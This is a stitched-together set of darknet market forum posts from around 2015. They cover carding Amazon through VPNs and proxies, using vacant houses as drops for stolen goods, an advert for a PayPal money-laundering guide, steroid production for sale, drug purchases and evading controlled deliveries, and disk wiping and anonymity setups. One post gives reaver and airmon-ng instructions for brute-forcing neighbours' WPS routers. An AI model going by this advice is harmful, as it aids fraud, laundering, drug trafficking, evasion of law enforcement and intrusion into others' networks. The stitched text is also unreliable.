And forensics are really only going to be involved if they have a warrant, otherwise the movement of such resources would be wasted because if they attempted to access the computer without the warrant - or even take it - they're breaking the law. With a warrant, they can just cut through the case if they so desired.~E"

It does not erase everything single bit on hard drive. DBAN DOES NOT ERASE the Host Protected Area (HPA) and Device Configuration Overlay (DCO) sectors of disk. My guide on how to successfully erase a hard drive. BUY this tool http://www.jetico.com/products/personal-privacy/bcwipe-total-wipeout - the cost is $39.99 USD JETICO TOTAL WIPE SOFTWARE is a bootable linux ISO from either usb stick or dvd. Inside 15 + wiping algorithms. JETICO TOTAL WIPE ERASES BOTH HPA & DCO SECTORS. Very important fact. DBAN misses both areas of disk. PART 2: After wipe with JETICO use Secure Erase  http://cmrr.ucsd.edu/people/Hughes/secure-erase.html Secure Erase restores hard drive to original state. Sponsor of project was the fucking NSA. PART 3: Encrypt hard drive with Veracrypt https://veracrypt.codeplex.com/ with 512SHA-AES256-Blowfish crypto. Now you have 100% clean hard drive. No information can be recovered UNLESS U GET NSA FIRMWARE MALWARE. This 3 part method is 95% successful in wipe/killing any information on hard drive. Nothing is 100%!

Regular deletion of a file removes it from this list and so considers the disk blocks free for use again, but leaving the old data intact (it is here that the need for special programs to thoroughly erase files arises).

"Evolution Forums","popadoppalus","47510","2015-02-11T16:58:08","Re: Formatting or DBAN'ing HDD?","Security & Anonymity","first off formatting does nothing to the data on the drive - that's why tou have option for quick format. all the format is a quickway to start over on your HDD. i n the old days you used to have to run DEBUG at at certain offset to start the low level format of a RLL or MFM drive type. Dban successfully deletes and over writes the data. Urban legend. you have to make multiple passes to overwrite previous data. that may have been true in the old days when tracks were much wider and tracking had much more play. with today's modern drives, the data is so densly packed that it only takes one wipe to render data unrecoverable. this is still not acceptable as it takes hours to run a single pass - even on a 500 GB drive. also realize that modern drives write data from beginning to end much like a CD is written. if you burn half a CD and look at it you see where the data is written. so modern drives start at the beginning (innermost track) and continue to write, with no overwriting until the end of the drive is reached. BTW defrag runs in the background, so there is no need to run it manually. as far as SSD drives go when you delete a file it is gone. there is no need to wipe it. in fact wiping an SSD drive actually does more harm than good as there are only a limited number of writes to the SSD and wiping decreases this number with no gain.   however, wiping a 1 TB drive even once can take hours and is no good when they are knocking at your door.  i might as well speak to encryption while i am here. an encrypted volume is a single file in the file system. so it will show up as fully written data - in other words there is blank spaces at the end of sectors when the whole sector is not written. an analysis of the randomness of this data can reveal that it is a hidden partition. i am not a fan of encryption anyway. but that is a personal choice and i understand that other people make good use out of it. it just my opinion that if data needs encryption, then it needs more protection than today's commercial encryption programs provide.  but back to the issue of wiping data. Unix has a shred command that overwrites and 'shreds' data on deletion rendering it unrecoverable. i have a routine that i coded that permanetly deletes a file to an unrecoverable state in Windows when it is deleted. but this doesn't solve the issue of overwriting (permanently removing) existing files or the problem of the time factor.  i have been pondering this dilemma for years and have finally come up with a solution. i am going to make a post in the interest section to see take the temperature of the community as to whether or not such a product is feasible. it could also be used on other media such as USB sticks (which BTW is where i store all my data.)",""

Youll find it in his store! Ive decided to put together a guide that will show you step by step how to produce your own steroids, This can be handy for many reasons such as making yourself a ton of cash and making the finished product for your own personal use (you will hardly be paying anything for a lengthy supply). Doing it this way as well you know exactly what has gone into that little vial of oil. You can create your own customized blends which would normally be very costly, I will be showing you were to source all of the materials needed to perform this procedure. I will also be here on hand to help you if any of you get stuck while performing the process. It is quite hard to mess up actually. Due to the legality of steroids in the UK and in some places in the EU you can easily set up a website to distribute these too. If you are good at that sort of thing! The profit margin depending on which steroids you are producing varies but there always Is a huge profit to be made on all of them. If you want to know the exact profit margins send me a PM and I will tell you. The guide will also be regularly updated just in case you guys noticed I have missed anything out which I'm sure I haven't (obviously free of charge!) Check my feedback on my store.   Thanks guys here is the listing: http://k5zq47j6wd3wdvjq.onion/listing/10155

Because it is so pure Im having trouble measuring doses, need to get some equipment to make sure I dont take too much. Anyway Ive still had a bit, just a little dab and think I can feel it but Ive had other stuff today. My guess is that is Kosher. What Im going to do tho is wait until tomorrow morning when Im clean and take some of that first so I can have a better judgement of its effects. It seems to be what it is listed at and at that price its brilliant. Anyway so I'll save the quality review till tomorrow or something but can still review the rest. I messaged him with loads of questions and he always responding quickly and politely before I purchased. Then today Ive probably a been a right pain in the arse for him, writing messages back and forward but he never lost his cool. He helped me with every single thing he could. Ordered it Sun, was shipped Mon, arrived Tuesday. This guy is a top vendor. A real class act. I cant recommend him enough. I will update with a quality review but Im quite confident it is good. Seems to be working but Im a degenerate so its hard to tell Ive already taken stuff before then. I'll take some of that first tomorrow so I am fresh and can judge better. Then I will update. The vendor is a star though, cant go wrong with Maximus. Thanks a lot, great deal, happy customer.",""

Ive been trying to card amazon with cards located in Los Angeles while i live only 3 hours away and use a Los Angeles VPN location on Cyberghost and it worked once but since then ive had no luck. Could it be that it was just a lucky thing that they just so happened to let me complete the sale that one time or is it because i am not using a Socks5 proxy? I figured i would not need one using a VPN and plus i live pretty close to the location i am using. After talking to a fellow carder, they recommended that i use ""Hidemyass.com"" as that is what they have been using for ritualistic carding with much success and reassured me that they do not use Socks5 proxys.  Are there any recommendations, reviews on hidemyass.com vs. Cyberghost 5, or professional advice on this subject?",""

"Evolution Forums","fruitful","45108","2015-01-23T23:57:44","Re: [Cyberghost 5 vs. Hidemyass.com]","Security & Anonymity","HideMyAss are defininetly 100% avoidable but CyberGhost cannot be confirmed. This is what they say in their statement regarding the whole VPN and those sensitive logs saga: See that they mention that they may have to allow LE to hijack a session in order to gain evidence against a person/organization/whoever.  And read this also Those guys are pretty darn transparent if you ask me and tell you like it is. They ain't saying they are some impenetrable solution for browsing the web, they say it numerous times that they could be compromised by law enforcement to provide information but upto now, those methods are unethical and time consuming and also require a lot of money and a lot of resources put into the whole operation, so unless it's a kingpin shifting kilos then or someone who's hacking into government systems then it's not worth it.  The decision is yours to make OP. Read this, the guys are basically saying; if you pay for the time and the resources, we will allow you access to our servers so you can see that no logs are kept, they are welcome specific organizations to inspect the datacenter also and see the servers physically.","There is only the theoretical possibility to intercept them, based on a court order, to record future surfing on a specific account (for example, to survey the activities of a terrorist cell). However, such operations require that, in addition to the court request, the relevant investigation authorities communicate us a connection IP or log-in data. In practice, this theoretical hypothesis is almost completely void of significance, and we have never used it.;As we said, we do not log, keep logs, protocol surfing behaviors or record content, visited websites or IP addresses of our users. Theoretically, we could do that. By implementing special logging tools a server can be monitored in general. However, the data flow from and to a certain user needs some more analysis to be done â which CyberGhost VPN explicitly refuses to do. To underline this, the company will always agree to be inspected by network specialists or net activists like EFF at any time on its own costs. We also announced a public Google hangout where we connect to a server of the audits choice and go in public through all settings, so everybody can see that there is no logging enabled or installed. Torrentfreak editors are welcome to ask questions live.;In case we are ordered to monitor a certain user account by a court in favor of preventing or unweave a crime, we will of course agree. No anonymization service stands outside the law. However, these orders are very rare. CyberGhost VPN itself never got asked up to now. The reason is quite simple: To be able to monitor a single account, CyberGhost VPN needs data about the account in question from the court, which is only available, if the respective owner already is under surveillance. The data CyberGhost VPN stores (the amount of traffic and its timestamps) cannot be used to identify a user â which finally means, that the use of an anonymization service by a suspect doesnât offer any additional evidence as already known.4. CyberGhost VPN has decided to publish a Transparency Report detailing only the number of the requests to disclose individual usersâ personal data received since its founding in 2011 up to the present day. The requests have been made by authorities, companies and individuals in relation to suspected offenses carried out through CyberGhost VPN. The company has not and could not in any circumstance provide user data to those who request it, because this would be in breach of CyberGhost VPNâs mission to protect its users, and because no user data records exist.Since CyberGhost VPN does not keep any records, the report does not list additional procedures following the requests. A review of the legality of the requests has not taken place either.5. First we would do is to review the legality of the court order with our local and international team of lawyers and search for possibilities to lodge an appeal to make sure that we operate on legal ground and that âLady Justice is blindâ and no procedural error happened.After we have left no stone unturned we would follow the court order. We do not stand outside the legal system â and we donât want to.If the specification of the court order would not be covered from our own Terms and Conditions (for example, because the court wants â for what reasons ever â find out the activities of a whistleblower like Edward Snowden) and our conscience would not allow to follow the court order, then we would shut down CyberGhost VPN and try to find a legal way to inform the public.6. None of the current P2P technologies are illegal per definition, but we have to block P2P protocols on our Free servers due to strategic reasons. We think this is traffic that unnecessary slows down the Free service and we want to keep the âlines freeâ for people that need a Free VPN to access and surf the web.However, we do have Premium servers that allow the use of P2P networks â except those in countries where we are forced by providers to block torrent traffic, e.g. in the USA.7. In order to enable a separation of the payment data from the data of the VPN user account, the invoicing and payment procedure is performed exclusively by third party resellers. All transactions performed via our internet website and our clients are conducted by our business partner cleverbridge AG who operates in the European Union. Cleverbridge AG supports customer payment in 29 currencies, representing 75 percent of the worldâs population.We also added anonymous ways to pay for our service. Bitcoin payments are conducted by our business partner Paybilla, who also operates in the EU. And costumers in Germany, Austria and Switzerland can buy CyberGhost VPN anonym by paying cash in a retail store.8. We recommend our users to use the Open VPN protocol that is integrated in our native clients for Windows, Mac and Android."

(if they did the certain unnamed LE agencies may go after those logs without bothering to ask a judge or prosecutor) (DEA agents have authority to issue administrative warrants on their own authority with no judge involved. i don't know what constitutes an administrative warrant, but i do know it can cover the history of your phone calls) in reality most DEA and other LE people have contacts friendly to their cause - that want to help for ego reasons or whatever. there is no reason to think that they don't have moles working inside some of these VPN companies. regarding the lengthy policy explanations above, the one that stands out is that bull shit about third party billing. obviously any company that operates on a subscription basis, must keep logs to know when the subscription expires. this may just be comparision to an entry into a database that is checked on every login, or it may entail logging all logins (and outs). but the idea of a third party having access and ability to monitor your activity is suspicious on its face. since you carders like to take the extra risk of hacking a wifi (which is illegal in itself and can lead to consequences maybe more serious than the carding itself) or if you use an anon public wifi (most bars don't keep any logs - thus making parallel comparisons harder - that is if you are logged in for 45 min & 30 seconds and DPR is logged in and out at same moments, it creates an inference that you may be the same person) but assume you come in from an anon source (regardless of how you got there) logging the activity regarding the VPN on the incoming side leads no where. on the other side of the VPN presumably you are loading TOR and that's end of that trail. where's the problem? just assume they log it and don't connect to the VPN from you own IP. worry more about whether someone is looking over your shoulder (e.g. VNC) or keylogger, or rootkit. obviously you are going to need a proxy to fool anybody. think about it this way a VPN is going to force all traffic through the VPN, a proxy only applies to your browser. now where there may be some sites where you can get away carding with a naked TOR exit node (like some of mine) you are going to find that most financial and big box stores will examine your connection for anything that looks wrong. one interesting note, in my experience with my own accounts if i get lost in their security dog and pony show, if i logout and login again - then the site  has forgotten that i was just there and have a clean slate, so to speak. of course if you really fuck up and it locks the site, you are screwed. i am not a carder but it seems to me that you could manually configure your browser with the socks proxy (or if you are a programmer write a routine that allows you to just input the IP you want to use and point the browser at the script - there is actually an option for using a script in the browser proxy settings). i have never tried those last two but i see no reason why they won't work. i can say that in regard to the VPN side i am a bit uncomfortable with the binary that you have to run to configure it. i understand why it is like that, but i test the routines in the sandbox. just for the record i have yearly subscription to AVG (the AV people) for 5 boxes for $39. i also use anon Mullvad for $5/mo BTC. the only issues i report is if for some reason the VPN quits working and i don't catch it quickly.",""

In 2014 WhatsApp was bought by Facebook. Facebook is pretty much the last company you want tu trust, when it comes to sensitive data. If you do trust them, you might as well go and communicate with your suppliers and clients on Facebook chat and use other Facebook services, instead of Evulotion and secure messaging. More or less same applies to Skype - owned by Microsoft. Would you really trust those guys? I know I would. To make things worse. Google up something called CarrierIQ... here's a quote from an Engaged(many other sources/articles exist) article on the subject: The most disturbing part in the quote is the key logging. It doesn't matter if you're using encrypted messaging, logging in via HTTPS - it is possible to record what is written, before it is encrypted.In short - if you're using Android, first thing I would do is, is rooting and installing Cyanogenmod or some other ROM, which are open source and without bloatware/malware inside. If you're using Windows phone or Fruit phone, I wouldn't trust it. Period.","sinz wrote:I was randomly wondering about this earlier today. Say I do all of my chatting over WhatsApp or any other 3rd party app...cops would go and try to pull my records from my service carrier, but they wouldn't get anything seeing that I use WhatsApp or whatever else, right?;Privacy concerns surrounding Carrier IQ were initially brought to light by Trevor Eckhart, a security researcher who became alarmed by the extent of information accessible by the analytic software. In the following video, Trevor presents much of his findings, which seemingly demonstrate Carrier IQ's keystroke logging, location tracking and ability to intercept text messages. Even information that should be transferred only within encrypted sessions is captured in plain text by Carrier IQ. During the entire demonstration, Trevor's phone was in airplane mode, operating only over WiFi. Although his actions were outside the scope of his wireless carrier (Sprint), the software continued to monitor his every key press. On his Android device, it's evident that Carrier IQ is running, even though it does not appear in the list of active processes. Further, the application doesn't respond to ""Force Quit"" commands, and it's set to startup when Android launches."

There are multiple houses in my area which are for sale, would it be fine to order to a house like that? I have a few questions regarding me using a drop house, with different scenarios, it would be appreciated if they could all be answered in some sort of detail: 1. Let's say I order a package that requires a signature or verification, how do I go around this? Do I just stay at the house and wait for the postman to come, and ""pretend"" I'm the owner of the house?  2. If I order something that does not require any signature or verification, but rather something that goes straight into the drop house mailbox, how do I go around retrieving it? Break the mailbox? At night time? 3. This last question is more targeted towards products: If I order drugs here (Ounce of weed for example) will that require verification or will it go into the mailbox? Lastly, if I order carded items such as Xbox's, PS4's etc that doesn't require verification, should I just stand there and pick them up, or will the postman just leave them there?

I've come across a couple of apps which are android only at the moment but I know there are iPhone versions due out this summer. They are both open source and use standard encryption techniques. The first is TextSecure, it acts just like your normal text messaging app, except I prefer it anyway, if that's all you use if for, however if the other person has it then the message will be sent fully encrypted end to end. The messages are stored locally in an encrypted database which is locked when the phone is turned on and can be timed to lock after a timeout or manually locked. If there is no data available then an encrypted text message can be sent as an option (although this obviously leaves the trail with your provider). The second is RedPhone which acts in a similar fashion except for calls. It acts as a normal dialer app except when the other person has it then you have the option for a fully encrypted phone call. I would like to make it clear that I am in no way affiliated with Open Whisper Systems the people who maintain these apps but I use them both and thought that perhaps some others might think they are worth looking at",""

I'm sure that with this, you will start receiving positive feedback like: We all know that managing a vendor account can sometimes requires time and effort, and that we'd love to answer all our client's sales very fast so they can use their product as soon as possible and they can also leave a positive and great feedback. âââââââââââââââââââââââAS A BUYERââââââââââââââââââââââYou find too frustrating waiting for that product you just ordered and visiting your account over and over just to see there's no new messages! Just be cool. If you're a market buyer, you can also use this tool to be alerted if your product has been delivered so you immediately can use it, or respond to the vendor while he's still online! You can also use this tool to know if there are any new messages in the inbox while doing other activities in other programs or in your bedroom.  Now it's time to get focused on other activities in the PC or in the bedroom and not to be worried about reloading your vendor account to see if any new sale happened. You just setup, and forget.  My guide will teach some nasty tricks that allow you to be updated every second of what is happening to your vendor account no matter how many you have. It even can tell you of several markets accounts at the same time! Now you can rest and focus on your other PC activities, because you can be sure that you will be notified if something interesting happens to your account. I'm selling this guide only for $5 guys. Is very few dollars for all the help it will give you!  Get it before it rise price!! Thanks for the support! Cheers! -bannedebooks- Some Reviews:

I read about this method before but I didn't actually know how to do the complete process. It deals with buying ingredient A and than selling that to get clean pp money.  You would need an additional thing to make this guide work(Which would cost around 30 bucks). It requires social engineering since you need to Buy and Sell. Although you wouldn't be scamming, you would still need to convince buyers and sellers. I should point out that guide does not deal with withdrawing the paypal money into a bank account and such. It just tells you how to clean the paypal money that you receive from paypal transfers and send it to another paypal account. It is a good way to get clean money for your cashout account and there will be no connection between your middleman account and cashout account.",""

It is composed of a 11 pages pdf, with a lot of images (plain text would be about 6-7 pages) to help people visualize the method. It is easy to do, it requires online chat interaction with other people (not voice, just chat) so we can say it requires some social engineering, and it works worldwide (although english is needed for chat interaction).

I would suggest to stick to the semi-cleaned funds on middleman account, in order to save a lot of work, but it's fine either way. This way, you'll get perfectly clean funds on a single step, without the need of more middleman accounts. And then you can cash them out as you please. The method is most likely unsaturable, as it has been going on for years and there's a huge market so it's almost impossible to sature it. This method require some work, but if done correctly, there's no limit to how much money you can get cleaned daily, although as you depend on other people for this, I can't assure you can do more than 1000$/daily. It would depend on how much do you work. The initial investment for this would be: -The guide price-The minimal price for a semi-cleaned transfer or dirty fund transfer -The price to obtain a middleman account. This would depend on your abilities, it can only cost you the price of a vcc and the documents, or you can buy Makikaki's guide to obtain middleman accounts. Not more than 250$ anyways.  This guide is good for both newbies that want to get into paypal transfers (although I cover most of the info, there might be stuff that you don't know, I can support you with that), and people who know how to get semi-cleaned funds but have struggles cashing out. I'd like to ask Yasuo if he would be gentle enough to make a review of the method as a vouch. Please refrain from asking for vouch copies until he accept or deny it. He left the forum and came back not long ago, but I guess he's not interested so I've one vouch from whoever wants it, and another one for him if he actually wants it.

This is explained by a lot of people, e.g. those who provide TAILS and Whonix and they really recommend against doing so. This has multiple reasons: One FIXED entry node:You always connect through the same/pair of VPN(s), thus exposing your security for the first time. From the issue above results the second one:the VPN/website fingerprinting.By observing the VPN server (your entry point) and the target site, someone can do a timing attack and guess that you are accessing this site at a specific time.See here: https://trac.torproject.org/projects/tor/wiki/doc/TorPlusVPN#VPNSSHFingerprinting Plus the VPN provider _could_ try to monitor you. So better chain your setup like this: Hacked WiFi/tethered Phone connection  -> Tor (use TAILS or Whonix to prevent leaks!) -> VPN -> Socks5 -> Fuck the system correctly. Hiding the fact that you are using tor is nearly impossible. If you are relying on the firstly named setup make sure to at least CHAIN two VPNs of different providers, so a timing/fingerprint attack becomes much harder. Do NOT stop using VPNs, they are good! Just use them properly. Cheers",""

(Where a lot more is relative)  This is true. They would need to control both servers. Your entry node and the target site. But imagine the feds are observing mullvad and paypal. It is not that hard to imagine this - after all Mr. Snowden recently revealed.E.g. they intercepted Googles traffic between their DCs. Assume this:I am watching Mullvad - i can see that you are accessing Mullvads server from your home IP. At 11:23:41.142 412bytes are sent from your home IP to mullvads server. That is all i know.And this is already enough.Between Mullvad and the socks that you are using to connect to PayPal there is Tor. And in this case it is already useless.Because I can see that 11:23:41.533 412bytes arrived at PayPals server. At this point i have no proof that it is YOU who is connecting to PayPal, since there are a lot of people connecting to PayPal. But If you do this over a long course of time I can determine your identity pretty well. Think about it. Same applies to our second statement.

Firstly you should use a vpn from a country not requiring logs. panama, sweden, seychelles. If the country laws state logs are not required and the vpn provider states they dont keep logs then better. Some vpns refuse to co-operate with outside governments.

Only way ur first vpn could be compromised is if it connects to ur illegal doings in the 1st place (your bad). Even if the 1st is compromised, it's only seeing encrypted data.

The 1st vpn only knows you are connecting to tor, the 2nd vpn only knows a tor user is doing malicious activity (and if u chain socks u can avoid that).

If you change the email address on the key, you will need to export the public key again, and upload it somewhere, or hand it out to your correspondents; they can add the updated key to their PGP keyrings, so the key they have will have the latest changes on it.  Even if someone does not update their copy of your key, they will still be able to encrypt messages to you, and you will still be able to decrypt messages as before.  Hope this helps.

Obviously got lucky with timing but great to see on a $1 product. Content: Good content more than advertised, also gives some techniques of getting a burner sim in AU. It is well written and the method is solid, there is an obvious upsell for the vendor but for the price that can't be knocked and they also acknowledge it is not necessary to take that option. Nothing particularly groundbreaking here but if you are at all interested in anonymity in AUS, and in fact internationally, and you don't know many techniques I am sure that you will find a couple here that really help you out. Value: Overall this guide is stupidly cheap and the vendor is giving it away at this price. Get it now before they realise and chuck it up to $20, it is easily worth that. GOOD BUY",""

I have been ordering shit online for about a year now (just small bits every couple of months) - never had any problems with packages not showing up or whatever but recently a mate of mine had a few hundred quid of class As seized at customs. I think all that happened was a letter was sent explaining that it had been seized. We live in the UK and it got me thinking before I made my next order. Realistically if a package gets seized at customs I dont see how they can incriminate you even if it is in your name? What is the likelihood that they will investigate further? Surely you can claim ignorance and there is nothing they can do do prove otherwise? Would a seizure at customs give them grounds to confiscate your laptop/phone etc to check for evidence? or to look through your bank statement?  As far as I understand it if you just keep your mouth shut and claim it was nothing to do with you there is nothing they can do?  I remember reading somewhere that if the package contains very very large quantities or something particularly illegal then they may bug the package or carry out some sort of controlled delivery ? If so is there any way to avoid incriminating yourself in a situation like that?  sorry i know this has probably been discussed a lot before but i'm new to these forums and couldn't seem to find a search bar anywhere",""

If they somehow catch your package when shipping domestically(very low chance) then they'll either just take it and send you a love letter or do a CD if there's a large amount. They honestly don't care about a few ounces of bud but when you've got 10 sheets of LSD going through then we're gonna have a problem. You can scream and shout that you're an innocent man but the parcel was going directly to your address under your name. A controlled delivery(CD) is when 1 of the DTs will pretend to be a courier and get you to sign for the package. I memorized what my courier(s) look like so I'll know immediately to turn away the package if it's another guy. I've wandered off but the main point is that if you sign for it and take it into your possession then they'll commence a raid at 1 point or another. Clean your home of anything illegal after receiving any packages. You'll be fine if you play it safe and don't order 10 keys of heroin to your mom's house.",""

The program to do that is  'Reaver'. Note: the router must have WPS enabled. ('wash mon0' command to check after airodump-ng to see WPS enabled routers)  the wifi cards dont need to support injection for WPS brute force, just monitor mode.  if you timeout often, a great hint to get around the router is to raise the mon interface up by one (airmon-ng wlan0 (or whatever your interface is) and use mon1 as the interface from that point on,  keep in mind the mac address for the wlan and mon interface need to match and also macchange -A (random known vendor) when u want to change and copy it to the current interface.  use the -N argument (no NACKS) and  -w argument to spoof win7 with reaver and you shouldnt have an issue. BUT MAKE SURE TO USE -N OR YOU WILL TIMEOUT IN 20 MINUTES (against most up-to-date firmware on routers)  once you buy alfa you'll never need another wifi card but you'll still need to learn all of this. you'll be fine with any of the alfa cards.",""

The method of making money with torrents is already known by most of the people here, as it is pretty basic. I've found a new way to increase this method a lot and make it way more profitable. In a PDF with 6 pages, I'll be explaining what you need, how to create torrents and how to promote them in the new way. Step by step, a lot of details and screenshots. I use 1 recent example of 11 June to guide you through the method. Conclusion: very simple guide, noob friendly, no further investments, easy money, trusted payouts. To download the necessary tools and register on some websites, it will take about 15 - 30 min. After setting up, it will take you 15 min to use the method and get it online. Buy this guide right now for $15, which is a fair price.  http://k5zq47j6wd3wdvjq.onion/listing/22494  Vouch copy sent to moka.  Feedback by customers

First of all please let me tell you that I already had this guide as a pack of 100+ others I had bought from CipherCracks a month back. The guide is from 2007. It does technically work but I was not able to make even $1 with it because it is not feasible due to the immense amount of work required. I was banned from most of the good torrent sites for using this and my torrents were deleted. Thus I had to start all over to start earning again. After 4 days of continuously following this guide word for word I made $0.78. The title is misleading and after following the guide I am sure that let alone earn $30 per torrent you will not be able to even make your money back if you buy this for $15. I have started a dispute in Evo market because I think this is a scam trying to make money of newbies who are looking to get rich quickly. I was also told during the course of my dispute that no one else had any problems with it and all the customers were satisfied. I would really like someone to speak up against me if that is true. I really want to make this work but after devoting more than 4 hours a day for 4 days I could not and I have been using torrents for more than 10 years now.",""

Idid not write this guide, however ill add some amendments that I feel are important and missed.1.) Where ever any guide ( like this) tells one to use Ubuntu Linux.... do not and use Ubuntu. Thereasoning is that with the newest additions of Ubuntu, they index and record your filesystem andsearching habits for juicy data they sell a dime a dozen to the man.Some nice alternatives are:-Debian-Linux Mint-Arch Linux-BSD2.) Encryption. Its not hard. You have Truecrypt and your silly HTTPS but thats not enough.When ever I contact my Darknet buddies I always use GPG encryption 4096 bit RSA to ensure mymessages, even if my connection got sniffed, never get read by the LE.Some nice practices are:-Truecrypt your partitions, VHD's, and other important files you need safe, always use ahidden partition with false files and such ... idk go to hackfourms or torrent books aboutbacktrack to make it look juciy yet dry.- Use GPG for contactshere's a nice link www.madboa.com/geek/gpg-quickstart/-Encrypt your homefolder when you install the OS of your choice3.) Believe it or not, all the encrpytion,tor,vpn, vps's, and proxies will not save you if you don't doone simple step... change your fucking mac address everytime.In linux:-install macchangerCode: Select allifconfig interface downmacchanger -r interfaceifconfig interface up4.) Do not upload pictures online taken by your phone, there have been a few Anonymous hackerscaught and are rotting in jail atm. Whenever one takes a pic with said phone, it embeds it with aGPS cord of where you took that pic. Plus there could be features within the picture itself that cangive away who you are.5.) Leave your ego for Call of Duty and your buddies. The more you talk about yourself, themore the other guy or LE can build a profile on you. If your talking about how hitler did nothingwrong on /pol/ all day while hacking Israel with #OPIsrael ... your gunna get caught real fast.Topiary got nailed for bragging on Xbox Live.6.) A word about DNS.... never use your ISP's even with daily activities.-Torango------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------That pretty much cover's it, when I get more time and resources i'll post more.

General Daily UsageBy the time you are finished reading and implementing this guide, you will be able to securelyand anonymously browse any website and to do so anonymously. No one not even your ISP or agovernment agent will be able to see what you are doing online. If privacy and anonymity isimportant to you, then you owe it to yourself to follow the instructions that are presented here.In order to prepare this guide for you, I have used a computer that is running Windows Vista.This guide will work equally well for other versions of Windows. If you use a different operatingsystem, you may need to have someone fluent in that operating system guide you through thisprocess. However, most parts of the process are easily duplicated in other operating systems.I have written this guide to be as newbie friendly as possible. Every step is fully detailed andexplained. I have tried to keep instructions explicit as possible. This way, so long as youpatiently follow each step, you will be just fine.In this guide from time to time you will be instructed to go to certain URLs to download files.You do NOT need TOR to get these files, and using TOR (while possible) will make thesedownloads very slow.This guide may appear overwhelming. Every single step is explained thoroughly and it is just amatter of following along until you are done. Once you are finished, you will have a very securesetup and it will be well worth the effort. Even though the guide appears huge, this wholeprocess should take at the most a few hours. You can finish it in phases over the course ofseveral days.It is highly recommended that you close *ALL* applications running on your computer beforestarting.=== 1 : Obtaining Tor Browser ===The first step to becoming secure and anonymous online is to setup and install something called""TOR"". ""TOR"" is short for""The Onion Router"". The concepts behind TOR were firstimplemented by the United States Military, and these principles have been used to create anextremely secure mechanism for being anonymous online. In fact, millions of people world-wideuse TOR to browse the internet and communicate anonymously.TOR works by heavily encrypting your communications so that no observer can see whatwebsite you are really going to, and what information is really being sent. It all appears as abunch of random characters to any observer. You simply use the TOR web browser just as youuse any other web browser. TOR takes care of the rest.However, TOR by itself is not enough. Even when using TOR, a user can be compromised in anumber of ways. First, some websites can be set up to attempt to reveal someone's true IPaddress (their true identity) by tricking their web browser or other software to transmitting thatinformation. For this reason, anyone who uses TOR will recommend that no one have javascriptor flash turned on while browsing TOR. In this guide however, I will show you a much bettersolution.The second issue is that of human error. Even if you have TOR installed, you may accidentallyforget which browser to put in a link. You may also accidentally click on a link from anotherprogram, such as a chat program. That program might then load the link you clicked on into anon-TOR browser. When you are using TOR, you must be careful *constantly* that every linkgoes into the right browser, and that you do not accidentally click the wrong link.So then, let's begin. Obtaining the TOR Browser is easy. Simply go to the following website:http://www.torproject.orgOnce here, you may feel free to read more about what TOR is and how it works, or you mayproceed to immediately download TOR.Here is how to do so:1. Click on ""Download TOR"", or ""Download"".2. You will see text that says, ""The Tor Browser Bundle contains everything you ned ... Justextract it and run. Learn more >>3. Click on this ""Learn more"" link. for the ""Tor Browser Bundle""4. Assuming you are an English speaker, you would choose the top-most link ""English (en-US)"".Otherwise, pick the languagebest suited to you.5. The file being saved will be named: tor-browser-1.3.18_en-US.exeIt is ok if the number is not exactly 1.3.18, there are new versions of Tor from time to time. Atthe time that this guide was written, 1.3.18 was most current. By the time you are reading this, amore current version of TOR may exist.6. Run this file.7. You will be prompted to extract this to a directory. By default, it will be set toC:\Users\You\Downloads\ This is perfectlyok. You can also choose a different directory if you wish.8. Click ""Extract""That's it. TOR Browser is NOW installed. Time to test it out!=== 2 : Using and Testing Tor Browser for the first time ===Now you have successfully downloaded and installed the Tor Web Browser Bundle. You are nodoubt anxious to begin using it. First, click on the ""start"" menu icon, the icon in the lower left ofyour screen with the windows logo. On the top right will be a listing that says ""You"",""Documents"", ""Pictures"", ""Music""... ""You"" of course will be replaced by your user name. Clickon ""You"", the top most link. This will open up your main user folder.Now, locate the folder called ""Downloads"" and double click on it.Now, inside the ""Downloads"" folder, double click on the folder called ""Tor Browser"".Lastly, double click on the application: ""Start Tor Browser""When you do, you will see the Vidalia Control Panel appear, and you will observe as youconnect to the TOR network. When this is complete, your web browser will open up and willautomatically connect to the web address: check.torproject.orgThis is to confirm that you are in fact using TOR. If you have followed this guide correctly, thenyou will see the following green text, or something similar:""Congratulations. Your browser is configured to use Tor.""Now you can use this web browser the same as any other. You can go to any website you wish,and neither your ISP or anyone else will be able to see where you are going, or what you aredoing. However, there are still issues that need to be resolved, so don't begin browsing just yet.******************************************** IMPORTANT SAFETY NOTE ********************************************If you fill out a form containing your email address, your name, or any other sensitiveinformation while using the TOR browser, be aware that sometimes it is possible for an observerto see that information. When using TOR, use it to access websites and content that you are*not* connected to via your real identity or any username or nick name which links to your realidentity. Let TOR be for anonymous browsing solely. Do your online banking, or any otheractivities involving your real identity using your normal web browser.************************************=== 3 : Securing Your Hard Drive ===Being able to browse anonymously is one thing. However, you may choose to download andsave sensitive content or material to your computer which you wish to keep private. This mayinclude reading sensitive documents, viewing pictures, or storing any kind of sensitive data.If you save *anything* to your computer's harddrive, then it is possible for someone who hasconfiscated your computer to determine what it was you saved. This is often true even if youdelete the content. For example, suppose I use the Tor Browser and I navigate to a websitecontaining a sensitive document that I wish to read. If I saved that document somewhere on myharddrive, then it is possible for someone else to find it. If I *delete* that document, it may stillbe possible for someone to undelete it.Further, even if I never save it to my harddrive but I simply look at it using my word processingsoftware, it may still be saved in a number of ways including:1. Often programs keep records of filenames. The filename alone is often enough to incriminatesomeone.2. Often programs keep parts of the content viewed saved for various reasons, such as forsearching. This can include random excerpts of text, thumbnails of images, and more. Often this""partial"" data is more than enough to prove what the original data was. Often the ""partial"" data isitself incriminating.3. Sometimes, especially if you are running low on system memory, your operating system maychoose to use your hard-disk as a temporary RAM. This is known as ""SWAP"". Normally,whenever you turn off your computer, whatever was in RAM is deleted. However, the data thatgoes to your SWAP may persist and it may be possible for someone to see what content you hadopen in your programs if that informationis saved in RAM.Generally speaking, you *must* have a plan to secure any content that is saved to your hard disk.Therefore, this guide would be incomplete if we did not thoroughly address this. First, there aretwo kinds of such content:1. Deliberately saved content.2. Inadvertently saved content.Deliberately saved content refers to content that you have chosen to save on your harddisk sothat you can access this content later. We will address how to do this later in the guide.Inadvertently saved content refers to content that is saved by programs you use, or youroperating system. You have no way to even know what this content might be. Therefore, this isthe most dangerous. You may browse and find a dozen sensitive documents, utterly delete them,and some program may have saved the file names and excerpts of the data. This will render yourprevious efforts futile.Content that is inadvertently saved to your harddisk comes in two flavors:1. Content that is saved to your SWAP space.2. Content that is saved by applications running on your computer, including your operatingsystem.The surest way to prevent content from writing to your SWAP space is to disable your SWAPspace altogether. This may result in your computer running a bit slower than normal, and maymean that you cannot use ram intensive 